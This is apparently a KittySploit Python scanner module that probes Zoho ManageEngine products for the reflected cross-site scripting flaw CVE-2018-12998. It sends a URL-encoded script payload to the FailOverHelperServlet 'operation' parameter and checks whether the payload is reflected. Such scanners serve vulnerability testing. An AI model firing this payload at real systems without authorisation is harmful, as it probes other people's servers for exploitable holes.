#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zoho manageengine is vulnerable to reflected cross-site scripting."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zoho manageengine - Cross-Site Scripting Detection',
        'description': "Zoho manageengine is vulnerable to reflected cross-site scripting. This impacts Zoho ManageEngine Netflow Analyzer before build 123137, Network Configuration Manager before build 123128, OpManager before build 123148, OpUtils before build 123161, and Firewall Analyzer before build 123147 via the parameter 'operation' to /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'zoho', 'xss', 'manageengine', 'packetstorm', 'zohocorp', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/unh3x/just4cve/issues/10',
            'http://packetstormsecurity.com/files/148635/Zoho-ManageEngine-13-13790-build-XSS-File-Read-File-Deletion.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-12998',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-12998',
    }

    def run(self):
        r = self.http_request(method="GET", path='/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Zoho manageengine - Cross-Site Scripting detected",
                path='/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

